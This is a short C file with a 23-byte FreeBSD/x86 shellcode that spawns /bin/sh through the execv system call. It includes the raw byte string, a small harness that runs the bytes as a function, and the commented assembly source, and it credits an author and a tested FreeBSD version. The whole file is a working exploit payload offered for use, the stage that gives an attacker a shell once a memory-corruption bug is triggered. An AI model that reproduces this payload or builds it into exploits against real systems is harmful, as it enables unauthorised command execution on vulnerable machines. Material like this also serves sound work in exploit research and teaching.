/*
 -------------- FreeBSD/x86 - execv("/bin/sh") 23 bytes -------------------------
 *  AUTHOR : Tosh
 *   OS    : BSDx86 (Tested on FreeBSD 8.1)
 *   EMAIL : tosh@tuxfamily.org
 */

#include <string.h>
#include <stdio.h>



char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
                   "\x54\x53\xb0\x3b\x50\xcd\x80";

int main(void)
{
   void(*f)() = (void*)shellcode;

   printf("Len = %d\n", sizeof(shellcode)-1);
   f();
}

/*!
 %define SYS_EXECV 59


section .text

global _start

_start:
   xor eax, eax

   push eax

   push '//sh'
   push '/bin'

   mov ebx, esp

   push eax
   push esp
   push ebx
   mov al, SYS_EXECV
   push eax
   int 0x80
*/